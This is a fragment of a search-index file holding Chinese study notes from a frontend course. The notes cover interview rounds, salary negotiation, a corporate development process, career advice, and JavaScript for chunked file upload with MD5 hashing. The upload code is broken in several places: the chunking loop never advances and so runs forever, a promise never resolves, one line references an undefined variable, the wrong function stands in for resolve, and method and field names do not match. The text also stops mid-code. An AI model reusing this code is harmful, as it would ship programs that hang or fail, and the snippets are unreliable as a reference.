<li>\u9879\u76ee\u6574\u4f53\u7684\u7ed3\u6784\uff08\u540e\u7aef\u662f\u4ec0\u4e48\u6846\u67b6\uff08MVC\uff0c\u6a21\u5f0f\uff1f\u600e\u6837\u8fdb\u884c\u4ea4\u4e92\uff1f\uff09\uff0c\u600e\u6837\u8fdb\u884c\u4ea4\u4e92\uff0c\u7b80\u5355\u7684\u6570\u636e\u5e93\u5b58\u50a8\uff09\u4e0d\u9700\u8981\u540e\u7aef\u903b\u8f91\u5b9e\u73b0\u3002</li> <li>\u67e5\u8be2\u7ec4\u4ef6\uff0c\u6539\u52a8\u4e00\u4e2a\u8054\u52a8\u7ec4\u4ef6\uff0c\u600e\u4e48\u5199\uff1f</li> <li>\u8bbe\u8ba1\u4e00\u4e2a\u7ec4\u4ef6\u5e93\uff1b\u5b9e\u73b0\u67d0\u4e00\u4e2a\u529f\u80fd\u7684\u601d\u8def\uff08\u624b\u5199\u4ee3\u7801\uff09\uff1b\u4ee5\u8682\u8681\u65e5\u5386\u7ec4\u4ef6\u4e3a\u4f8b\u5b50</li> <li>\u4e00\u4e2a\u9879\u76ee\u4e0b\u6765\uff0c\u7136\u540e\u505a\u4e00\u4e2a\u603b\u7ed3\u3002\uff08\u81ea\u5df1\u5de5\u4f5c\u7684\u6bcf\u4e00\u4e2a\u4efb\u52a1\uff0c\u90fd\u603b\u7ed3\u4e00\u4e0b\u77e5\u8bc6\u70b9\u548c\u5b66\u5230\u7684\u4e1c\u897f\uff09</li> <li>\u5176\u4ed6\uff1agithub\u6709\u5f88\u591a\u8d21\u732e\u3001\u535a\u5ba2\u603b\u7ed3\u3001\u65e5\u5e38\u9047\u5230\u95ee\u9898\u603b\u7ed3\uff1b\u65e5\u5e38\u5f00\u53d1\u7684\u5751\uff1b\u8bba\u575b\u4e0a\u9762\u7ecf\u5178\u7684\u95ee\u9898\uff08stackOverflow\uff0c\u77e5\u4e4e\u3001\u6398\u91d1\uff09</li> </ul> <p>\u975e\u6280\u672f\u7684\u65b9\u9762\uff1a\u6392\u671f\uff08\u65f6\u95f4\u7d27\u5f20\u5b89\u6392\u65f6\u95f4\uff09</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_5","title":"\u4e09\u9762\uff1a\u8001\u677f","text":"<ul> <li>\u6c9f\u901a\u80fd\u529b\uff1a\u6c9f\u901a\uff08\u548c\u4ea7\u54c1\u3001\u540e\u7aef\u3001\u548c\u8bbe\u8ba1\u5e08\uff09</li> <li>\u6027\u683c\u6d4b\u8bd5\uff1a\u6297\u538b\uff08\u8eab\u4f53\u8f83\u597d\uff0c\u53ef\u4ee5\u627f\u53d7\u538b\u529b\uff1b\u5fc3\u7406\u7d20\u8d28\u8f83\u597d\uff09</li> </ul>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#hr","title":"\u56db\u9762\uff1a\u6c9f\u901a\u85aa\u8d44HR","text":"<ul> <li>\u81ea\u5df1\u6709\u4e00\u4e2abaseLine\u3002\u6211\u5bf9\u5916\u8981\u6c42\u662f\u662f25K\uff0c\u5e95\u7ebf\u662f20K\u3002\u8df3\u4e00\u6b21\u6da830%\u3002\u6211\u7684\u4e0a\u4e2a\u516c\u53f8\u6c34\u5e73\u662f 16K\uff0c\u6240\u4ee5\u73b0\u5728\u81f3\u5c1120K\u3002</li> <li>\u73b0\u5728\u7684\u5b9e\u9645\u85aa\u8d44\u8bc1\u660e\u3002\u8fd9\u90e8\u5206\u548c HR \u8bf4\uff1a\u4e0d\u5728\u85aa\u8d44\u91cc\u9762\u7684\u798f\u5229\u53ef\u4ee5\u8bf4\u3002\u6211\u4eec\u6709\u534a\u5e74\u5956\u91d1\u3001\u5e74\u7ec8\u5956\u91d1\u3001\u8fc7\u8282\u798f\u5229\u3002\u6211\u4eec\u73b0\u5728\u7684\u5de5\u4f5c\u5f3a\u5ea6\u4e0d\u9ad8\u3002\u6211\u4eec\u5168\u90e8\u65e5\u5e38\u5f00\u9500\u53ef\u4ee5\u62a5\u9500\u7b49\u7b49\u3002</li> <li>HR \u4e00\u822c\u90fd\u4f1a\u85aa\u8d44\u8bc1\u660e\uff08\u534a\u5e74\u5185\u94f6\u884c\u6d41\u6c34\uff1b\u4e0d\u8981\u9020\u5047\uff09\u3001\u79bb\u804c\u8bc1\u660e\uff1b</li> </ul>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_6","title":"\u9762\u8bd5\u51c6\u5907","text":"<p>\u7b80\u5386\uff1a\u91cd\u70b9\u7a81\u51fa\uff1b\u9762\u8bd5\u4e3b\u8981\u662f\u57fa\u7840\u77e5\u8bc6\u91cd\u70b9\u7a81\u7834\uff1b\u7b97\u6cd5\u662f\u80fd\u529b\uff0c\u9762\u8bd5\u524d\u96be\u4ee5\u77ed\u65f6\u95f4\u63d0\u9ad8\uff1b</p> <p>\u9762\u8bd5\u524d\u8003\u8651\u597d\uff0c\u662f\u5426\u81ea\u5df1\u7684\u4f18\u52bf\uff08\u516c\u53f8\u3001\u56e2\u961f\u3001\u4e1a\u52a1\u3001\u804c\u4f4d\u8981\u6c42\uff09\uff0c\u628a\u63e1\u5927\uff08\u8fd9\u6b21\u9762\u8bd5\u662f\u7ec3\u624b\uff0c\u8fd8\u662f\u76ee\u6807\u5c31\u662f\u8f6c\u884c\uff09\u907f\u514d\u76f2\u76ee\u7684\u6295\u7b80\u5386\u3002\u56e0\u4e3a\u9762\u8bd5\u8bb0\u5f55\u5728\u7cfb\u7edf\u4e2d\u7684\uff0c\u540e\u671f\u7684\u9762\u8bd5\u4f1a\u53c2\u8003\u524d\u51e0\u6b21\u7684\u9762\u8bd5\u7ecf\u5386\uff0c\u5f71\u54cd\u4ee5\u540e\u7684\u7ecf\u5386\uff08\u5927\u5382\uff09\u3002</p> <p>\u5c31\u7b97\u4e0d\u6362\u5de5\u4f5c\uff0c\u4e5f\u53bb\u8bd5\u8bd5\u60c5\u51b5\uff0c\u770b\u770b\u81ea\u5df1\u7684\u60c5\u51b5\u548c\u5e02\u573a\u8981\u6c42\u7684\u60c5\u51b5\u662f\u5426\u5339\u914d\u3002</p> <p>\u8bef\u533a\uff1a\u76f2\u76ee\u5237\u9898\uff1b\u76f2\u76ee\u6295\u7b80\u5386\uff1b\u6b7b\u8bb0\u786c\u80cc\uff1b</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_7","title":"\u767e\u5ea6\u5f00\u53d1\u6d41\u7a0b","text":"<ul> <li> <p>Kikk-off \u529f\u80fd\u6709\u6ca1\u6709\u5fc5\u8981\u505a\uff0c\u662f\u5426\u80fd\u505a\uff1fPM \u5f81\u6c42\u5168\u90e8\u6210\u5458\u7684\u610f\u89c1-\u901a\u5e38\u8981\u505a</p> </li> <li> <p>PM \u5199 MRD \u9700\u6c42\u6587\u6863\uff08word\uff09\uff0c\u9700\u6c42\u8bc4\u5ba1-\u4ed4\u7ec6\u542c\uff1b\u8ba4\u771f\u4e86\u89e3\u529f\u80fd\u70b9\uff1b\u4e0d\u80fd\u53ea\u770b\u8bbes\u8ba1\u7a3f\uff1b\u548c\u6d4b\u8bd5\u8fbe\u6210\u4e00\u81f4\uff08PM-\u5f00\u53d1-\u6d4b\u8bd5QA\uff09\uff1bPM \u5c31\u662f\u786e\u8ba4\uff0c\u5c31\u505a\u6210\u4ec0\u4e48\u6837\u5b50\uff0c\u61c2\u4e1a\u52a1\u3002\u5982\u679c\u626f\u4e0d\u6e05\uff0c\u90a3\u4e48\u5c31\u662f\u5f00\u53d1\u7684\u9505\u3002\u5403\u900f\u9700\u6c42\uff08\u8bbe\u8ba1\u6587\u6863\uff09\u53ea\u8981\u6539JS\u90e8\u5206\uff0c\u540e\u671f\u7ef4\u62a4\u6bd4\u8f83\u597d\u3002\u8bbe\u8ba1\u597d\u4e86\u518d\u52a8\u4ee3\u7801\u3002\u4f18\u5316\u5c31\u77e5\u9053\u65b9\u5411\u4e86\u3002</p> </li> <li> <p>\u4ea4\u4e92\u89c6\u89c9\u8bbe\u8ba1\uff1a\u67d0\u4e2a\u9875\u9762\u8df3\u8f6c\uff0c\u72b6\u6001\u53d8\u5316\u3002\uff08\u4ea4\u4e92\u7a3f\u3001\u8bbe\u8ba1\u7a3f\uff09</p> </li> <li> <p>\u5f00\u53d1\u8bbe\u8ba1\u8bc4\u5ba1\uff08\u540e\u7aef\u5f00\u53d1\uff09\u540e\u7aef\u51fa\u4e00\u4e2a\u501f\u53e3\u6587\u6863</p> </li> <li> <p>\u524d\u7aef\u540e\u7aef\u5f00\u53d1-\u8054\u8c03-\u81ea\u6d4b\uff08\u524d\u7aef\u540e\u7aef\u5185\u90e8\u6d4b\u8bd5\uff09</p> </li> <li> <p>\u6548\u679c\u786e\u8ba4\uff08PM\u786e\u8ba4\u662f\u5426\u6548\u679c\uff09\u3001\u53ef\u4ee5\u786e\u8ba4\u90ae\u4ef6</p> </li> <li> <p>\u6d4b\u8bd5\u9636\u6bb5\uff1a\u5f00\u53d1\u9700\u8981\u81ea\u6d4bP0\u7ea7\u522b\u7684\u7528\u4f8b\uff08\u6838\u5fc3\u529f\u80fd\u5fc5\u987b\u6d4b\u8bd5\u901a\u8fc7\uff0c\u8fd9\u4e2a\u5f88\u91cd\u8981\uff09\uff1bP0\u6d4b\u8bd5\u901a\u8fc7\u540e\uff0c\u7136\u540e\u4e0d\u65ad\u6807\u8bb0Bug\uff0c\u7136\u540e\u4e00\u6b65\u6b65\u66f4\u6539\u3002</p> </li> <li> <p>\u4fee\u590dBUG\uff1a\u5f00\u53d1\u4e00\u5468\u7684\u9879\u76ee\uff0c\u524d\u7aef\u4e0d\u80fd\u8d85\u8fc710\u4e2aBUG\u3002\u5343\u884cBUG\u7387\uff08\u4ee3\u7801\u8d28\u91cf\uff09\u3002\u5927\u5382\u6bd4\u8f83\u89c4\u8303\uff0c\u4e5f\u6bd4\u8f83\u8017\u65f6\u3002</p> </li> <li>\u6d4b\u8bd5\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u4e0a\u7ebf\uff08\u5f71\u54cd\u54ea\u4e9b\u9875\u9762\u548c\u6a21\u5757\uff0c\u5199\u5728\u6587\u6863\u91cc\u9762\uff0c\u524d\u540e\u7aef\u95ee\u9898\uff09\u3002</li> <li>\u4e0a\u7ebf\u540e\uff0c\u96c6\u4e2d\u56de\u5f52\uff08\u4e0a\u7ebf\u901a\u62a5\uff09\u3002</li> </ul> <p>\u65b0\u4eba\u538b\u529b\u8f83\u5927\uff0c\u540e\u671f\u5c31\u597d\u505a\u591a\u4e86\u3002</p>"},{"location":"ebook-kaikeba-frontend/06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/#_8","title":"\u804c\u4e1a\u89c4\u5212","text":"<p>\u6e05\u695a\u7684\u8ba4\u8bc6\u81ea\u5df1\u9002\u5408\u4ec0\u4e48\u6837\u7684\u5de5\u4f5c\uff1b\u6c89\u79ef\u6210\u672c</p> <ul> <li>\u60f3\u6e05\u695a\u81ea\u5df1\u9002\u5408\u4ec0\u4e48\u5c97\u4f4d\uff1f\uff0830\u5c81\u524d\u60f3\u660e\u767d\uff09</li> <li>\u505a\u597d\u65b0\u5c97\u4f4d\u6240\u9700\u8981\u7684\u6280\u80fd</li> <li>\u8f6c\u884c\uff0835\u5c81\u524d\u8f6c\uff09</li> </ul> <p>\u6280\u672f\u7701\u5fc3\u8d39\u8111\u5b50\uff1b\u6280\u672f\u7ba1\u7406\u8d39\u5fc3\uff1b\u6c9f\u901a\u534f\u8c03\u4e5f\u662f\u4e00\u4e2a\u4f18\u52bf\u3002</p> <p>\u5728\u65e5\u5e38\u5de5\u4f5c\u4e2d\u9002\u5408\u505a\u4ec0\u4e48\uff1f</p> <p>\u5b66\u4e60\u522b\u4eba\u7684\u5de5\u4f5c\u65b9\u6cd5\uff1b\u5b66\u751f\u671f\u95f4\u6709\u8001\u5e08\uff0c\u770b\u522b\u4eba\u600e\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u903b\u8f91\uff08\u770b\u4ee3\u7801\uff09\uff1b</p> <p>\u4e3a\u4ec0\u4e48\u8981\u6362\u516c\u53f8\u6362\u5c97\u4f4d\uff1f</p> <p>\u81ea\u5df1\u7684\u6c34\u5e73\u4f4e\u4e8e\u5468\u8fb9\u73af\u5883\uff0c\u8fd9\u6837\u624d\u6709\u63d0\u5347\u3002</p> <p>\u9009\u62e9\u6bd4\u52aa\u529b\u66f4\u91cd\u8981\uff0c\u4ec0\u4e48\u6837\u7684\u5e73\u53f0\u6210\u5c31\u4ec0\u4e48\u6837\u7684\u672a\u6765\u3002</p> <p>\u65f6\u95f4\u6bd4\u7269\u8d28\u66f4\u91cd\u8981\uff0c\u6548\u7387\u95ee\u9898\u3002</p>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/","title":"\u9879\u76ee\u8bfe\u7b2c\u4e00\u8282\u7b14\u8bb0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 19991  \u9605\u8bfb40\u5206\u949f</p> <p>2021-10</p> <p>\u524d\u7aef\u5de5\u7a0b\u5e08\u57fa\u672c\u6280\u80fd\uff1avue+react+node \u57fa\u672c\u5b9e\u73b0\u589e\u5220\u6539\u67e5\u529f\u80fd\uff08node+mysql+vue\uff09</p>"},{"location":"ebook-kaikeba-frontend/07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/#_2","title":"\u5b98\u65b9\u7b2c\u4e00\u8282\u7b14\u8bb0","text":"<p>\u9879\u76ee\u5c3d\u53ef\u80fd\u628a\u6bcf\u4e2a\u9700\u6c42\uff0c\u90fd\u505a\u6210\u4eae\u70b9\uff08\u7ad9\u5728\u67b6\u6784\u5e08\u7684\u2ec6\u5ea6\uff0c\u6765\u8bbe\u8ba1\u9879\u76ee\uff09</p> <ol> <li> <p>\u7ea0\u6b63\u89c6\u2ec6\uff0c\u4e0d\u4ece\u5f00\u53d1\u5de5\u7a0b\u5e08\u7684\u2ec6\u5ea6\u6765\u770b\uff0c\u4ece\u524d\u7aef\u67b6\u6784\u5e08\u89d2\u5ea6\uff0c\u589e\u5220\u6539\u67e5\u7684\u4ee3\u7801\uff0c\u53ea\u662f\u4e00\u5c0f\u90e8\u5206\u5de5\u4f5c</p> </li> <li> <p>\u4e00\u4e2a\u9879\u76ee\u9700\u8981\u4ec0\u4e48</p> </li> </ol> <pre><code>1. \u6587\u6863\n2. \u7248\u672c\u63a7\u5236\uff08git\uff0cgitlab\uff0c github\uff09\u5236\u5b9a\u89c4\u8303\uff08\u5206\u652f\u7ba1\u7406\uff0cgit message\uff09master test dev\n3. \u8d28\u91cf\uff08\u4ee3\u7801\u8d28\u91cf\uff0ceslint\uff0cjest\u3001jira\u3002\u3002bug\u7ba1\u7406\uff09\n4. \u5f00\u53d1\u6d41\u7a0b\uff08\u654f\u6377\u5f00\u53d1\uff09 \n5. \u5199\u4ee3\u7801\uff08\u4ee3\u7801\u8bbe\u8ba1\uff08\u5206\u6a21\u5757\uff0c\u5206\u4efb\u52a1\uff09\uff0c\u4ee3\u7801\u5b9e\u73b0\uff0c\u8054\u8c03\uff09 \n6. \u81ea\u52a8\u5316\u6d4b\u8bd5\uff1b\u53d1\u5e03\u90e8\u7f72\uff08\u81ea\u52a8\u5316\u90e8\u7f72 docker \u90e8\u7f72\uff09mvp\u7248\u672c\u53d1\u6b65\uff0c\u7ed9\u4ea7\u54c1\u6d4b\u8bd5\u8bc4\u4f30\u53cd\u9988\uff0c\u540e\u7eed\u8003\u8651\u7684\u5de5\u4f5c\u548c\u4efb\u52a1\uff080.1\u7248\u672c\u4e0a\u7ebf\uff09\n7. \u7ef4\u62a4\uff0c\u529f\u80fd\u5f00\u53d1456\u6301\u7eed\u6267\u884c\uff080.x \u7248\u672c\u4e0a\u7ebf\uff09\n8. \u63d0\u5347\u5f00\u53d1\u6548\u7387\uff08\u7ec4\u4ef6\u5316\uff0c\u53d1npm\u5305\uff0c\u8003\u8651\u5728\u5185\u90e8\u7f51\u7edc\u642d\u5efa\u79c1\u6709npm\u670d\u52a1\uff09\n9. \u6743\u9650\uff0c\u76d1\u63a7\uff0c\u7edf\u8ba1\uff0c\u62a5\u9519\u6536\u96c6\uff0c\u91cf\u5316\u6211\u4eec\u7684\u4ea7\u54c1\u6027\u80fd\n10. \u4e0a\u9762\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u7684\u5185\u5bb9\uff0c\u8003\u8651\u56fa\u5316\u6c89\u6dc0\u4e3a\u7cfb\u7edf\uff0c\u8fd9\u5c31\u662f\u524d\u7aef\u56e2\u961f\u7684\u57fa\u7840\u5efa\u8bbe\n</code></pre> <ol> <li> <p>\u4e00\u4e2a\u9879\u76ee\u600e\u4e48\u505a\u624d\u7b97\u4eae\u70b9\uff08\u4eae\u70b9\u624d\u80fd\u5347\u804c\u52a0\u85aa\uff0c\u9762\u8bd5\u5c55\u793a\u81ea\u5df1\uff09</p> <ol> <li> <p>\u6bcf\u4e2a\u9700\u6c42\uff0c\u90fd\u53ef\u4ee5\u505a\u6210\u4f60\u7684\u4eae\u70b9\uff0c\u53ea\u8981\u4f60\u6709\u5fc3\uff08\u6027\u80fd\u62a5\u9519\u5361\u987f\uff09 <pre><code>1. \u6570\u636e\u91cf\u5f88\u5927\uff08\u6dd8\u5b9d\u7535\u5546\uff09\n2. \u7f51\u7edc\u4e0d\u7a33\u5b9a\uff0c\u6027\u80fd\u53d7\u9650\uff08\u653f\u5e9c\u7535\u8111\u8001\u7248\u672c\uff09\n3. \u7528\u6237\u4f53\u9a8c\uff08\u4ea7\u54c1\u628a\u7528\u6237\u60f3\u6210\u50bb\u5b50\uff09\n</code></pre></p> </li> <li> <p>\u6587\u4ef6\u4e0a\u4f20</p> </li> </ol> <pre><code>1. inputtype=file,axios.post,node\u63a5\u53d7\u6587\u4ef6\u5b58\u8d77\u6765\uff0cover \u6700\u591a\u52a0\u4e00\u4e2a\u4e0a\u4f20\u8fdb\u5ea6\u6761\n2. \u7c98\u8d34\uff0c\u62d6\u62fd\uff08\u4e8b\u4ef6\u5904\u7406\uff09\n</code></pre> </li> </ol> <p>\u4e0a\u4f20\u6587\u4ef6</p> <pre><code>&lt;template&gt;\n    &lt;input type=\"file\" name=\"file\" @change=\"handleFileChange\"&gt;\n    &lt;el-button @click=\"uploadFile\"&gt;&lt;/el-button&gt;\n    &lt;el-precess :stroke-width='20' :text-inside=\"true\" : percentage=\"uploadProcess\"&gt;&lt;/el-precess&gt;\n&lt;/template&gt;\n</code></pre> <pre><code>   3. \u6587\u4ef62\u4e2aG\u7684\u89c6\u9891\uff0c\u7f51\u901f100K\u8fd8\u4e0d\u7a33\u5b9a\uff0c\u5076\u5c14\u4f1a\u65ad\u5f00\n    1. \u6587\u4ef6\u5207\u7247\uff0c\u5206\u7247\u4e0a\u4f20\n    2. \u65ad\u70b9\u7eed\u4f20\uff08\u4e0a\u4f20\u4e4b\u524d\uff0c\u540e\u7aef\u544a\u77e5\u5df2\u7ecf\u5b58\u5728\u7684\u5207\u7247\uff0c\u9700\u8981\u540e\u7aef\u7684\u914d\u5408\uff09\n    3. file.slice\uff08\uff09\u5c31\u53ef\u4ee5\u505a\u6587\u4ef6\u5207\u7247\u4e86-\u4e5f\u9700\u8981\u540e\u7aef\u914d\u5408\n\n   4. \u5982\u4f55\u8ba9\u540e\u7aef\u77e5\u9053\u4f60\u662f\u54ea\u4e2a\u6587\u4ef6\uff1f\u5982\u4f55\u786e\u5b9a\u6587\u4ef6\u7684\u552f\u4e00\u6027\uff0c\u7528\u6587\u4ef6\u540d\u80af\u5b9a\u4e0d\u9760\u8c31\uff08\u4f7f\u7528md5\u505a\u54c8\u5e0c\uff09Md5\uff0c\u8ba1\u7b97\u5bc6\u96c6\uff0c2G\u7684\u6587\u4ef6\u5927\u6982\u8ba1\u7b97md5\u898115\u79d2\u5de6\u53f3\u7684\u65f6\u95f4\uff0c\u600e\u4e48\u89e3\u51b3\u5361\u987f\u95ee\u9898\uff1f\n    1. webworker\uff08\u4f1a\u989d\u5916\u52a0\u8f7djs\uff0c\u6709\u6027\u80fd\u989d\u5916\u7684\u635f\u8017\uff0c\u9700\u8981\u65b0\u7684\u8fdb\u7a0b\uff09\n    2. \u6846\u67b6\u6e90\u7801\uff0c\u600e\u4e48\u5904\u7406\u4efb\u52a1\u91cf\u5927\u8fd9\u4e2a\u573a\u666f\uff1f\uff08\u903b\u8f91\u6bd4\u8f83\u590d\u6742\uff09\n        1. \u65f6\u95f4\u5207\u7247\u6765\u8ba1\u7b97\uff0c\u5229\u7528\u6d4f\u89c8\u5668\u7a7a\u95f2\u65f6\u95f4\u8ba1\u7b97\n        2. requestIdleCallback \u4f60\u4e5f\u53ef\u4ee5\u81ea\u5df1\u6a21\u62df\uff0c\u5229\u7528 event-loop \u7684\u673a\u5236\u5c31\u53ef\u4ee5\u6a21\u62df\u3002\u6d4f\u89c8\u5668\u4e2d Performance \u53ef\u4ee5\u770b\u5230 idle \u90e8\u5206\u7684\u65f6\u95f4\u3002\u6d4f\u89c8\u5668\u7684\u65f6\u95f4\u5206\u4e3a\uff1ascripting, rendering, painting, system, idle \u90e8\u5206\u3002\u7136\u540e\u52a0\u5bc6\u7b97\u6cd5\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u7a7a\u95f2\u65f6\u95f4\u8ba1\u7b97\uff08\u53c2\u8003React\u6e90\u7801\u5c31\u662f\u81ea\u5df1\u6a21\u62df\u7684\uff09\n        3. \u62bd\u6837\u54c8\u5e0c\uff08\u91ce\u8def\u5b50\uff09\uff1a\u62bd\u53d6\u7279\u5f81\u503c\u3002\u6bcf\u4e2a\u5207\u7247\u90fd\u662f1M\uff0c\u7b2c\u4e00\u4e2a\u5207\u7247\u548c\u6700\u540e \u4e00\u4e2a\u5207\u7247\u5168\u90e8\u7684\u6570\u636e\u3002\u4e2d\u95f4\u7684\u5207\u7247\u53d6\u524d\u4e2d\u540e2\u5404\u5b57\u8282\uff0c\u62fc\u5728\u4e00\u8d77\u3002\u6587\u4ef6\u591a\u5927\uff0c\u62bd\u6837\u503c\u90fd\u57283M\u4ee5\u5185\u3002\u5e03\u9686\u8fc7\u6ee4\u5668\uff08\u7b97\u6cd5\uff09\u4e24\u4e2a\u6587\u4ef6hash\u4e00\u6837\uff0c\u53ef\u80fd\u6587\u4ef6\u4e0d\u4e00\u6837\uff0chash\u4e0d\u4e00\u6837\uff0c\u6587\u4ef6\u4e00\u5b9a\u4e0d\u4e00\u6837\u3002file.slice\u4e0d\u4f1a\u9020\u6210\u5361\u987f\uff0c\u6d4f\u89c8\u5668\u5e76\u6ca1\u6709\u65b0\u5efa\u5185\u5b58\u533a\u95f4\u6765\u5b58\u50a8\u3002\n</code></pre> <p>web-worker \u8ba1\u7b97\u54c8\u5e0c</p> <pre><code>self.importScripts('spark-md5.min.js');\n\n// \u53c2\u6570\u662f\u4e3b\u7ebf\u7a0b\u4f20\u9012\u7684\u6570\u636e\nself.onmessage = (e) =&gt; {\n  const { chunks } = e.data;\n  const spark = new self.SparkMD5.ArrayBuffer();\n\n  let progress = 0;\n  let count = 0;\n\n  const loadNext = index =&gt; {\n    const reader = new FileReader();\n    reader.readAsArrayBuffer(chunks[index].file);\n    reader.onload = (e) =&gt; {\n      count++;\n      spark.append(e.target.result);\n      if (count == chunks.length) {\n        self.postMessage({\n          progress: 100,\n          hash: spark.end(),\n        })\n      } else {\n        progress += 100 / chunks.length;\n        self.postMessage({\n          progress,\n        })\n        loadNext(count);\n      }\n    }\n  }\n  loadNext(0);\n}\n</code></pre> <p>\u8ba1\u7b97\u54c8\u5e0c\u7684\u4e09\u79cd\u65b9\u6cd5</p> <pre><code>import { allResolved } from \"q\";\n\nclass Upload {\n  // \u5224\u65ad\u56fe\u7247\u6587\u4ef6\n  async isImage(file) {\n    return await this.isGif(file) || await this.isPng(file);\n  }\n\n  // \u521b\u5efa\u6587\u4ef6\u5206\u7247\uff08\u6309\u7167\u5c3a\u5ea6\u5207\u5206\u6587\u4ef6\uff09\n  createFileChunk(file, size = CHUNK_SIZE) {\n    const chunks = [];\n    let cur = 0;\n    while (cur &lt; this.file.size) {\n      chunks.push({\n        index: cur,\n        file: this.file.slice(cur, cur + size),\n      });\n    }\n    return chunks;\n  }\n\n  // \u8ba1\u7b97\u54c8\u5e0c\u65b9\u6cd51\uff1a\u901a\u8fc7\u5916\u90e8\u7684 webworker \u8ba1\u7b97\u54c8\u5e0c\u503c\n  async calculateHashWorker() {\n    return new Promise((resolve) =&gt; {\n      // \u8fd9\u4e2a\u6587\u4ef6\u5355\u72ec\u5199\n      this.worker = new Worker('./hash.js');\n      // \u4e3b\u7ebf\u7a0b\u548c\u5de5\u4f5c\u7ebf\u7a0b\u901a\u4fe1\u65b9\u6cd5\n      this.worker.postMessage({ chunks: this.chunks });\n      this.worker.onmessage = (e) =&gt; {\n        const { progress, hash } = e.data;\n        this.hasProgress = Number(progress.toFixed(2));\n        if (hash) {\n          resolve(hash);\n        }\n      }\n    });\n  }\n\n  // \u8ba1\u7b97\u54c8\u5e0c\u65b9\u6cd52\uff1a\u901a\u8fc7\u6d4f\u89c8\u5668\u7a7a\u95f2\u65f6\u95f4\u8ba1\u7b97\n  // \u6d4f\u89c8\u5668\u901a\u5e38 60 fps\uff0c\u90a3\u4e48\u6bcf\u6b21\u7684\u95f4\u9694\u662f 16.7 Ms\n  async calculateHashIdle() {\n    const chunks = this.chunks;\n    return new Promise((resolve) =&gt; {\n      const spark = new sparkMD5.ArrayBuffer();\n      let count = 0;\n\n      const appendToSpark = async (file) =&gt; {\n        return new Promise((resolve) =&gt; {\n          const reader = new FileReader();\n          reader.readAsArrayBuffer(file);\n          reader.onload = e =&gt; {\n            spark.append(a.target.result);\n          }\n        })\n      }\n\n      const workLoop = async (deadline) =&gt; {\n        // timeRemaining \u5f53\u524d\u5e27\u7684\u5269\u4f59\u65f6\u95f4\n        while (count &lt; chunks.length &amp;&amp; deadline.timeRemaining() &gt; 1) {\n          // \u7a7a\u95f2\u65f6\u95f4\uff0c\u4e14\u5207\u7247\u8fd8\u6709\n          await appendToSpark(chunks[count].file);\n          count++;\n          if (count &lt; chunks.length) {\n            this.hashProgress = Number(\n              ((100 * count) / chunks.length.toFixed(2))\n            );\n          } else {\n            this.hashProgress = 100;\n            allResolved(spark.end());\n          }\n        }\n        // \u65b9\u6cd5\u5185\u90e8\u4f1a\u7ee7\u7eed\u8c03\u7528\u81ea\u5df1\uff0c\u4fdd\u8bc1\u7ee7\u7eed\u7b97hash\n        window.requestIdleCallback(workLoop);\n      }\n      // \u6d4f\u89c8\u5668\u7a7a\u95f2\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u65b9\u6cd5(\u6267\u884c\u4e00\u6b21)\n      window.requestIdleCallback(workLoop);\n    })\n  }\n\n  // \u8ba1\u7b97\u54c8\u5e0c\u65b9\u6cd53\uff1a\u5e03\u9686\u8ba1\u7b97\u6cd5\n  async calculateHashSample() {\n    // \u5e03\u9686\u8fc7\u6ee4\u5668\uff0c\u5224\u65ad\u4e00\u4e2a\u6570\u636e\u662f\u5426\u5b58\u5728\n    // \u4e00\u4e2aG\u7684\u6587\u4ef6\uff0c\u62bd\u6837\u540e\u57285M\u4e4b\u5185\n    // hash \u4e00\u6837\uff0c\u6587\u4ef6\u4e0d\u4e00\u5b9a\u4e00\u6837\n    // hash\u4e0d\u4e00\u6837\uff0c\u6587\u4ef6\u4e00\u5b9a\u4e0d\u4e00\u6837\n    return new Promise((resolve) =&gt; {\n      const spark = new sparkMD5.ArrayBuffer();\n      const reader = new FileReader();\n\n      const file = this.file;\n      const size = file.size;\n      const offset = 2 * 1024 * 1024;\n      // \u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u533a\u5757\u7684\u6570\u636e\u5168\u90e8\u8981\n      let chunks = [file.slice(0, offset)];\n      let cur = offset;\n      while (cur &lt; size) {\n        if (cur + offset &gt;= size) {\n          // \u6700\u540e\u4e00\u4e2a\u533a\u5757\n          chunks.push(file.slice(cur, cur + offset));\n        } else {\n          // \u4e2d\u95f4\u7684\u533a\u5757\n          const mid = cur + offset / 2;\n          const end = cur + offset;\n          chunks.push(file.slice(cur, cur + 2));\n          chunks.push(file.slice(mid, mid + 2));\n          chunks.push(file.slice(end - 2, end));\n        }\n        cur += offset;\n      }\n      // \u4e2d\u95f4\u7684\u90e8\u5206\uff0c\u53d6\u524d\u4e2d\u540e\u4e24\u4e2a\u5b57\u8282\u5373\u53ef\n      reader.readAsArrayBuffer(new Blob(chunks));\n      reader.onload = e =&gt; {\n        spark.append(e.target.result);\n        this.hashProgress = 100;\n        resolve(spark.end());\n      }\n    })\n  }\n\n  async uploadFile() {\n    // \u5148\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\n    if (!await this.isImage(this.file)) {\n      console.log('file is not image');\n    } else {\n      console.log('file is correct');\n    }\n    // \u6587\u4ef6\u5206\u7247\n    const chunks = this.createFileChunk(this.file);\n\n    // \u4e09\u79cd\u8ba1\u7b97hash\u7684\u65b9\u6cd5\uff08\u4e0a\u9762\u7684\u65b9\u6cd5\uff09\n    // webworker\n    // const hash = await this.calculatedHashWorker();\n\n    // idle\n    // const hash = await this.calculatedHashIdle();\n\n    // sample\n    // 